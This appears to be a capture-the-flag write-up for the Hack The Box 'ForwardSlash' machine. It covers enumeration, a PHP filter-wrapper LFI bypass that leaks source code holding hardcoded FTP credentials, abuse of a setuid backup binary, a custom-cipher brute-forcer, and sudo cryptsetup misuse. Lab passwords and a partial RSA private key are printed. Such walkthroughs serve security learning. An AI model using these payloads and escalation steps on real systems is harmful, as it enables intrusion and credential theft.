---
title: "ForwardSlash"
difficulty: Hard
os: Linux
points: 40
rating: 3.8
date: 2020-04-04
avatar: assets/htb/forwardslash.png
tags: [Local File Inclusion, XXE Injection, Server Side Request Forgery (SSRF), Information Disclosure, Directory Traversal, Weak Cryptography, Reconnaissance, Web Site Structure Discovery]
htb_url: https://app.hackthebox.com/machines/ForwardSlash
---
## Overview

### Useful Skills and Tools

## Enumeration

### Nmap scan

I kicked things off by running an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-`, a shorthand telling nmap to cover every TCP port; `-sC`, which is the same as `--script=default` and fires the default enumeration scripts at the host; `-sV` for service version detection; and `-oN <name>` to write the results to a file named `<name>`.

```text
kac0@kalimaa:~/htb/forwardslash$ nmap -p- -sC -sV -oN forwardslash.nmap <YOUR_IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 15:59 EDT
Nmap scan report for forwardslash.htb (<YOUR_IP>)
Host is up (0.046s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Backslash Gang
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.01 seconds
```

Only two ports were exposed on this box: `80 - HTTP` and `22 - SSH`.  With no SSH credentials in hand, I opened a browser and headed to `http://<YOUR_IP>`.

![This page was automatically redirected to from <YOUR_IP>](assets/wu/forwardslash/img-1.png)

Hitting port 80 immediately bounced me over to `forwardslash.htb`.  To make that redirect resolve and reach the page, I had to append the following line to `/etc/hosts`:

```text
<YOUR_IP>    forwardslash.htb
```

With the hostname in `/etc/hosts`, I browsed to `http://forwardslash.htb` and landed on a page that the "Backslash Gang" had defaced.

![title - Backslash Gang](assets/wu/forwardslash/img-2.png)

The Backslash Gang left a message behind:

> Defaced • This was ridiculous, who even uses XML and Automatic FTP Logins

These read like hints about how they broke in.  I jotted down a reminder to watch for anything FTP- or XML-related while enumerating.  Beyond the defaced page there wasn't much else to work with, so I pressed on.

### Dirbuster - forwardslash.htb

![](assets/wu/forwardslash/img-3.png)

Dirbuster turned up what at first seemed like a ton of files, but on closer look the server was just returning a `403 - Access Denied` for any request containing `.htaccess` or `.htpasswd`.  One reachable file did stand out, though.

![](assets/wu/forwardslash/img-4.png)

It looked like one of the server's owners had left a note for the other.  The `note.txt` file referenced two possible usernames, `pain` and `chiv`, and also hinted at the existence of a backup site. 

### Virtual Host Enumeration

Ippsec's [`HTB - Player`](%20https://www.youtube.com/watch?v=JpzREo7XLOY) video covers "vhost enumeration" and shows how to discover additional virtual hosts that resolve to the same IP. Having seen it earlier, I knew `gobuster` could enumerate these sites: 

```text
kac0@kalimaa:~/htb/forwardslash$ gobuster vhost -u http://forwardslash.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://forwardslash.htb
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/07/03 13:41:04 Starting gobuster
===============================================================
Found: backup.forwardslash.htb (Status: 302) [Size: 33]
===============================================================
2020/07/03 13:50:13 Finished
===============================================================
```

Pointing it at a list of the 110,000 most common subdomains, I quickly uncovered the backup site `chiv` had referenced in his note.  As before, I added the new domain to `/etc/hosts` and went to visit it.

### The Backup site

![](assets/wu/forwardslash/img-5.png)

Visiting `http://backup.forwardslash.htb` redirected me yet again, this time to a login page at [http://backup.forwardslash.htb/login.php](http://backup.forwardslash.htb/login.php).  Lacking any credentials, I just registered a fresh account and logged in.

![](assets/wu/forwardslash/img-6.png)

After logging in I was met with this page.  The supposed dashboard didn't give me much to work with.

![Breaking the fourth wall](assets/wu/forwardslash/img-7.png)

The box's author slipped in a friendly public service announcement for anyone playing.  Don't smoke, folks.  It's disgusting, and think of all the cat-girls you could save.

With little else to go on, I turned to `cewl` to build a wordlist from each page of this site as well as the main page.  

```text
cewl -H Cookie:PHPSESSID=h8242m3lv04gh9veco69de98ni http://backup.forwardslash.htb/environment.php >> forwardslash.cewl
```

It's a good habit to feed every new site through `cewl` just in case.  It frequently surfaces candidate usernames, passwords, or fresh subdomains and pages to dig into.

### Dirbuster redux - backup.forwardslash.htb

![](assets/wu/forwardslash/img-8.png)

About now, my Dirbuster run against the new subdomain wrapped up.  With plenty of results to sift through, I chose to finish reviewing the ones I'd already noticed after logging in before digging deeper.

![](assets/wu/forwardslash/img-9.png)

The URL and Submit fields on the [http://backup.forwardslash.htb/profilepicture.php](http://backup.forwardslash.htb/profilepicture.php) page were disabled, but I suspected I could easily get around that by inspecting the HTML.

![](assets/wu/forwardslash/img-10.png)

 Sure enough, they'd just slapped the "disabled" attribute on both fields.  Stripping that out re-enabled them.  

```text

 attacked us, simply echos as debug now -->
```

### Local File Inclusion testing

I used Burp to probe whether LFI was possible.

![](assets/wu/forwardslash/img-11.png)

This pulled back `/etc/passwd`.

```text
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
lxd:x:105:65534::/var/lib/lxd/:/bin/false 
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false 
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
pain:x:1000:1000:pain:/home/pain:/bin/bash 
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash 
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```

There were two login-capable users, `chiv` and `pain`. I'd already seen both names trading notes in the HTML and in the earlier `note.txt`.

While experimenting with various ways to upload and download files, I accidentally pasted the URL `http://backup.forwardslash.htb/config.php` and the server handed me back the source of the file.

```text
<?php
//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'www-data');
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
define('DB_NAME', 'site');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

This gave me what appeared to be a password hash for `www-data`, though `/etc/passwd` told me that account couldn't get a shell.  I tried the same trick against the other pages dirbuster had found, like `api.php`, `login.php`, and `profilepicture.php`, but each one just returned "Permission Denied; not that way ;\)".  The winking face and the "not that way" phrasing suggested I was on the right track and simply needed to push a little harder.  

### Bypassing web filtering

My first guess was that a web-application firewall was in play, so I dug around until I came across [https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/).  After trying several bypass techniques without even getting a response, I kept searching and eventually found a section in `PayloadsAlltheThings` tailored exactly to this PHP file-inclusion scenario.  [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File Inclusion/README.md\#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#wrapper-phpfilter)

The page offered several examples for defeating PHP filters, like base64- or rot-13-encoding the request.  I started with base64, submitting `pHp://FilTer/convert.base64-encode/resource=login.php`.  It worked on the first try, returning the `login.php` page as a base64 blob.  Decoding it in Burp gave me the page source, though it held nothing of value.  I then worked through every page dirbuster had found until I reached `pHp://FilTer/convert.base64-encode/resource=dev/index.php`, which returned the base64 string:

```text
PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
```

which decodes to: `dev/index.php`

```text
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
    <h1>XML Api Test</h1>
    <h3>This is our api test for when our new website gets refurbished</h3>
    <form action="/dev/index.php" method="get" id="xmltest">
        <textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
        <input type="submit">
    </form>

</html>

Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

    $reg = '/ftp:\/\/[\s\S]*\/\"/';
    //$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

    if (preg_match($reg, $_GET['xml'], $match)) {
        $ip = explode('/', $match[0])[2];
        echo $ip;
        error_log("Connecting");

        $conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

        error_log("Logging in");

        if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

            error_log("Getting file");
            echo ftp_get_string($conn_id, "debug.txt");
        }

        exit;
    }

    libxml_disable_entity_loader (false);
    $xmlfile = $_GET["xml"];
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $api = simplexml_import_dom($dom);
    $req = $api->request;
    echo "-----output-----<br>\r\n";
    echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

This was the hardcoded FTP auto-login the Backslash Gang had complained about, and it handed me credentials for `chiv`.  I tried the username/password pair over SSH and was dropped straight into a shell. 

## Initial Foothold

#### Enumeration as user `chiv`

This account didn't hold the flag, so I figured I'd have to pivot laterally to `pain` to claim my first score.

linpeas.sh is my go-to all-in-one enumeration script.

Open ports - nothing useful.

Users:

```text
[+] Users with console
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash                                                        
pain:x:1000:1000:pain:/home/pain:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

usr/bin/backup:

```text
[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
...snipped...
-r--r--r-- 1 root root 129 May 27  2019 /var/backups/note.txt
```

```text
[+] Searching passwords in config PHP files
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
```

### The python script

Oddly, I could read into `pain`'s home directory.  Inside sat yet another note plus a python script alongside some ciphertext in the `encryptorinator/` folder.  

```text
chiv@forwardslash:/home/pain$ ls
encryptorinator  note.txt  user.txt
chiv@forwardslash:/home/pain$ cat note.txt 
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv

chiv@forwardslash:/home/pain/encryptorinator$ ls -la
total 16
drwxr-xr-x 2 pain root 4096 Mar 24 12:06 .
drwxr-xr-x 7 pain pain 4096 Mar 17 20:28 ..
-rw-r--r-- 1 pain root  165 Jun  3  2019 ciphertext
-rw-r--r-- 1 pain root  931 Jun  3  2019 encrypter.py
```

To make analysis easier, I pulled both files back to my own box.

```text
chiv@forwardslash:/home/pain/encryptorinator$ python -m SimpleHTTPServer 8099
Serving HTTP on 0.0.0.0 port 8099 ...
10.10.15.82 - - [06/Jul/2020 14:05:56] "GET /encrypter.py HTTP/1.1" 200 -
10.10.15.82 - - [06/Jul/2020 14:06:07] "GET /ciphertext HTTP/1.1" 200 -
```

The `encrypter.py` script had been redacted and no longer held the logic needed to decrypt the ciphertext.  

```text
print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

My first instinct was, "let me check the backups linpeas flagged to see if the full script is sitting somewhere".  _\(For the record, there is no "full script" and you could decrypt this right now.\)_

## Road to User

### Further enumeration

One program in `/usr/bin/` caught my eye.

```text
-r-sr-xr-x  1 pain   pain       13384 Mar  6 10:06  backup
```

It carried the setuid bit and was owned by `pain`, so I figured the binary might let me move laterally into `pain`'s account.

The `/var/backups` folder held a pile of backed-up files plus one more note from `pain`.  

```text
chiv@forwardslash:/var/backups$ ls -la
total 1004
drwxr-xr-x  3 root root             4096 Jul  6 06:25 .
drwxr-xr-x 14 root root             4096 Mar  5 14:25 ..
-rw-r--r--  1 root root            61440 Mar 24 06:25 alternatives.tar.0
-rw-r--r--  1 root root            38908 Mar 24 06:17 apt.extended_states.0
-rw-r--r--  1 root root             4115 Mar  6 14:17 apt.extended_states.1.gz
-rw-r--r--  1 root root             3909 Mar  5 14:46 apt.extended_states.2.gz
-rw-------  1 pain pain              526 Jun 21  2019 config.php.bak
-rw-r--r--  1 root root              437 Mar  5 14:07 dpkg.diversions.0
-rw-r--r--  1 root root              202 Mar  5 14:07 dpkg.diversions.1.gz
-rw-r--r--  1 root root              207 Mar  5 14:47 dpkg.statoverride.0
-rw-r--r--  1 root root              171 Mar  5 14:47 dpkg.statoverride.1.gz
-rw-r--r--  1 root root           668374 Mar 24 06:17 dpkg.status.0
-rw-r--r--  1 root root           188241 Mar 24 06:17 dpkg.status.1.gz
-rw-------  1 root root              730 Mar 17 20:13 group.bak
-rw-------  1 root shadow            604 Mar 17 20:13 gshadow.bak
-r--r--r--  1 root root              129 May 27  2019 note.txt
-rw-------  1 root root             1660 Mar  5 14:46 passwd.bak
drwxrwx---  2 root backupoperator   4096 May 27  2019 recovery
-rw-------  1 root shadow           1174 Mar  6 14:21 shadow.bak
chiv@forwardslash:/var/backups$ cat note.txt 

Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.

-Pain
```

I figured he meant this file, `-rw------- 1 pain pain 526 Jun 21 2019 config.php.bak`, given I'd already found a password in the backup site's `config.php`.  Maybe this one wasn't encrypted like the earlier value.  

We also can't access `/var/backups/recovery`, so I'd need to revisit that `backup` binary. Since it's on $PATH, I simply ran it.

```text
chiv@forwardslash:~$ backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 17:14:04
ERROR: d09b25378e01dd1af648dca8a641e52e Does Not Exist or Is Not Accessible By Me, Exiting...
```

Interesting - it's hunting for the hash of something, notes that it only works when the backup is taken in the same second, and prints the time. A bit of experimenting revealed the hash is just an md5 of the current time in `HH:MM:SS` format. `echo $(date +%T) | md5sum | cut -c1-32` produces a hash matching the program's time; now I need to script reading the file and feeding it the hash simultaneously \(the `cut` is there because md5sum appends `- <filename>` to its output\). 

I'll try it against the config backup. The one I found earlier had a long hash, so maybe this is the pre-encryption version.

Aha - I need to symlink the file to the correct hash; and I don't have to point `backup` at the file, just run it from the directory I want it to operate in.

After plenty of trial and error: hashing the time wasn't lining up \(machine or network lag, perhaps?\), so I instead grabbed the hash straight from the program and symlinked the backup file to it.

```text
chiv@forwardslash:/dev/shm$ ./bak.sh 
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 18:33:28
File cannot be opened.
```

More trial and error showed the script has to be run from the user's home directory. With that, my test file was read successfully. On to the config backup.

### Finding user creds

```text
chiv@forwardslash:~$ /dev/shm/bak.sh 
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 18:38:30
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

I first tried to decrypt the password, but despite appearances it wasn't a hash at all - it was the password itself.

### User.txt

```text
pain@forwardslash:~$ ls
encryptorinator  note.txt  user.txt
pain@forwardslash:~$ cat user.txt 
cd2c************************8cf8
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `pain`

Enumerating as this user was quick, since I'd already turned up most things as `chiv`.  As I always do with a new account, I checked my privileges using `sudo -l` and `groups`.

```text
pain@forwardslash:/var/backups/recovery$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
pain@forwardslash:~$ groups
pain backupoperator
```

The `backupoperator` group rang a bell.  I'd seen it earlier on that inaccessible folder in `/var/backups`. 

### The encrypted backup file

```text
pain@forwardslash:/var/backups$ cd recovery/
pain@forwardslash:/var/backups/recovery$ ls -la
total 976576
drwxrwx--- 2 root backupoperator       4096 Jul  6 19:35 .
drwxr-xr-x 3 root root                 4096 Jul  6 06:25 ..
-rw-r----- 1 root backupoperator 1000000000 Jul  6 19:35 encrypted_backup.img
```

 Entering that folder, I found `encrypted_backup.img`.  This had to be the backup file `pain` was permitted to handle via `sudo`.  

Running `luksOpen` against it, though, prompted for a passphrase.  The note in `pain`'s home had referenced some "crypto magic" applied to the key, so I circled back to decrypt that ciphertext with the python script. 

### Python decryption script revisited

I worked on the script through a lot of trial and error.

#### Fixing UnicodeDecodeError in Python scripts

```text
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 932: invalid continuation byte
```

I hit this error while decrypting \(I've run into it with rockyou.txt before too\).  [https://github.com/wpscanteam/wpscan/issues/190](https://github.com/wpscanteam/wpscan/issues/190) - the encoding issues with rockyou.txt and the ciphertext were fixed by switching to `'latin'` encoding.

```text
kac0@kalimaa:~/htb/forwardslash$ vi -c 'let $enc = &fileencoding | execute "!echo Encoding:  $enc" | q' ciphertext 

Encoding: latin1

Press ENTER or type command to continue
```

The final script:

```python
import string

def decrypt(key, msg):
  lkey = list(key)
  lmsg = list(msg)
  for char_key in reversed(lkey):
      for i in reversed(range(len(lmsg))):
          if i == 0:
              tmp = ord(lmsg[i]) - (ord(char_key) + ord(lmsg[-1]))
          else:
              tmp = ord(lmsg[i]) - (ord(char_key) + ord(lmsg[i-1]))
          while tmp < 0:
              tmp += 256
          if tmp > 256:
            tmp = 105 #randomly picked to fix out-of-range chars
          elif tmp == 0:
            tmp = 90 #randomly picked to fix out-of-range chars
          lmsg[i] = chr(tmp)
  return ''.join(lmsg)

#checks the output from crypto and sees if at least 60% is ascii letters and returns true for possible plaintext
def is_plaintext(ptext):
    num_letters = sum(map(lambda x : 1 if x in string.ascii_letters else 0, ptext))
    if num_letters / len(ptext) >= .6:
      return True

def main():
  with open('ciphertext', 'r', encoding='latin1') as ctext, open('key', 'r', encoding='latin1') as rock:
      cipher = ctext.read()
      #print(cipher + ': ' + str(len(cipher))) #for testing that the cypher is being read properly.  Needed latin encoding, as UTF-8 invalid

      for line in rock:
        line = line.strip() #remove any spaces or newlines
        #print('trying: ' + line) #testing file read purposes...too many lines of output to keep

        ptext = decrypt(line, cipher)
        
        #only print the result if it contains > 60% letters, can be tweaked.
        if is_plaintext(ptext): 
          print('plaintext found: ' + ptext)
          print('The key was: ' + line)
          exit() #exit on positive result. Remove if false positives.
        
if (__name__ == '__main__'): 
  try: 
      main() 
  except KeyboardInterrupt: 
      exit()
```

Python script output:

```text
kac0@kalimaa:~/htb/forwardslash$ python3 ./decryptor.py
plaintext found: ©¹b`ÛºK§T=ox&yorSÔaé[8vá[(ý;fryption tool, pretty secure hÏäþð5ÖMG3õzhere is the key to the encrypted image from /var/backups/recovery: cB!6%sdHòj^@Y*$C2cf
The key was: theroadtorainbows
```

With the hard part done and the backup password recovered via my python script, the rest was fairly easy.  The sudo-allowed commands lay out exactly what's possible. 

From the CryptSetup man page: [http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html](http://manpages.ubuntu.com/manpages/xenial/man8/cryptsetup.8.html).

> luksOpen   \(old syntax\)
>
>           Opens the LUKS device &lt;device&gt; and  sets  up  a  mapping  &lt;name&gt;  after  successful          verification  of  the  supplied  passphrase.  If the passphrase is not supplied via --key-file, the command prompts for it interactively.

So the device is our backup file, the `<name>` is `backup` \(the command reads `/bin/mount /dev/mapper/backup ./mnt/`\), and we'll need to create a `./mnt/` directory.

### Getting a shell

```text
pain@forwardslash:/var/backups/recovery$ sudo cryptsetup luksOpen encrypted_backup.img backup
Enter passphrase for encrypted_backup.img: 
pain@forwardslash:/var/backups/recovery$ sudo /bin/mount /dev/mapper/backup ./mnt/
pain@forwardslash:/var/backups/recovery$ cd mnt/
pain@forwardslash:/var/backups/recovery/mnt$ ls
id_rsa
pain@forwardslash:/var/backups/recovery/mnt$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
